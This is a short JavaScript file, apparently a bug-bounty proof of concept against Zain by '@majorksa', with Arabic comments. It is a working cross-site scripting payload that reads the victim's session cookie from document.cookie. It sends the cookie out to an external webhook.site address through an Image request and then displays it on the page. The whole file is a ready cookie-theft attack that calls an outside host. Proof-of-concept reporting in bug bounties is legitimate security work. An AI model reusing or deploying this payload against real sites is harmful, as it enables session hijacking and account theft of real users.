
// poc.js - ZAIN BUG BOUNTY CRITICAL PoC
// Author: @majorksa
// For testing only

(() => {
  if (window.pwned) return;
  window.pwned = true;

  // 1. تنبيه واضح
  alert("PWNED BY @majorksa - ZAIN BUG BOUNTY");

  // 2. استخراج الكوكيز
  const cookie = document.cookie;
  console.log("[PWNED] Full Session Cookie:", cookie);

  // 3. إرسال الكوكيز عبر Image (تجاوز CORS)
  const img = new Image();
  img.src = 'https://webhook.site/ff691a2c-ed0b-4a58-97eb-8ff65afacf7b?cookie=' + encodeURIComponent(cookie);
  console.log("[PWNED] Cookie sent via Image (CORS bypass)");

  // 4. إظهار الكوكيز على الشاشة (دليل بصري)
  const box = document.createElement('div');
  box.style.cssText = `
    position: fixed; bottom: 10px; left: 10px; background: red; color: white;
    padding: 12px; font-weight: bold; z-index: 99999; border-radius: 8px;
    font-family: Arial; box-shadow: 0 0 10px rgba(0,0,0,0.5);
  `;
  box.innerHTML = `<strong>PWNED!</strong><br>Cookie: ${cookie.substring(0, 60)}...`;
  document.body.appendChild(box);
})();
